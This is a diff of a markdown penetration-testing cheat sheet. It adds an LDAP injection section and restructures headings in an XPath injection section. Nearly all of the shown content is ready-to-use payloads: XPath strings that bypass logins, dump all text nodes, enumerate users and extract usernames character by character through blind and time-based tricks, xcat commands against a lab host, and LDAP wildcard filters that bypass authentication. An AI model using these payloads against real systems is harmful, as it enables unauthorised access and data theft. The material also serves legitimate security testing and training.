@@ -78,20 +78,20 @@
 |-------|-------------|
 | //module[tier=2]/title/text() \| //module[tier=3]/title/text() | Select the title of all modules in tiers 2 and 3 |
 
-## Authentication bypass
+### Authentication bypass
 
 - `' or '1'='1` in username and password field, returns first user entry, doesn't work when password hashed
 - `' or true() or '` in username field, returns first entry, bypasses hashed password
 - `' or position()=n or '` in username field, use to enumarate users, returns nth user entry, bypasses password hash
 - `' or contains(.,'admin') or '` in username field, returns entries with 'admin' in the name, bypasses password hash
 
-## Data Exfiltration
+### Data Exfiltration
 
 - `') or ('1'='1` insert into parameters to confirm XPath injection
 - `GET /index.php?q=')+and+('1'='2&f=fullstreetname+|+//text() HTTP/1.1` append a new query to return all text nodes
 - `/a/b/c[contains(d/text(), '') or ('1'='1')]/../../..//text()` same result as previous but requires knowing the schema depth
 
-### Enumeration
+#### Enumeration
 
 - `?q=')+and+('1'='2&f=fullstreetname+|+/*[1]` used to chack query depth, nothing returned from original query, incrementally append further `/*[1]` until responses change > correct result > no result, correct result is the depth of path 1,1,1,1 (1,2,1,1,1,1 could have a deeper path etc).
 - Once depth known can start enumerating through records, again when no result recieved the previous was the last entry
@@ -106,7 +106,7 @@
     - `|+/*[1]+/*[1]+/*[2]+/*[4]`
 - `q: ') and (position()>0) and ('1'='1`another method using the predicate, see how many data items are returned and increment `0` by that many to get the next batch and repeat (restricted to the node being quried)
 
-## Blind Exploitation
+### Blind Exploitation
 
 - `invalid' or '1'='1` used to confirm exploitable if form responds differently for valid and invalid entries
 - `invalid' or string-length(name(/*[1]))=n and '1'='1` check if the length of the root element node's name is `n`, if treated as valid then node name length is `n`
@@ -115,15 +115,15 @@
 - `invalid' or string-length(/users/user[1]/username)=n and '1'='1` calculate the length `n` of the username value for the 1st user under the users node
 - `invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1` find the value of the first letter of the the first users username
 
-## Time-based Exploitation
+### Time-based Exploitation
 
 - `invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1` causes time delay if condition is correct by forcing iteration over entire xml document exponentially
 
-## Tools
+### Tools
 
 [**xcat**](https://github.com/orf/xcat)
 
-### Basic Commands
+#### Basic Commands
 
 | Command     | Description |
 |-------------|-------------|
@@ -133,7 +133,7 @@
 | run         | retrieve the XML document by exploiting the XPath injection |
 | shell       | xcat shell to run system commands |
 
-### Examples
+#### Examples
 
 ```bash
 pip3 install cython
@@ -144,3 +144,14 @@ xcat detect http://172.17.0.2/index.php username username=admin -m POST --true-s
 xcat run http://172.17.0.2/index.php username username=admin -m POST --true-string=successfully --encode FORM
 ```
 
+## LDAP Injection
+
+### LDAP - Authentication Bypass
+
+Try various wildcards
+- `(&(uid=*)(userPassword=*))`
+- `(&(uid=admin*)(userPassword=*))`
+- `(&(uid=*admin*)(userPassword=*))`
+
+Try or and
+- `(&(uid=admin)(|(&)(userPassword=abc)))` - a username of ``admin)(|(&` and a password of `abc)`
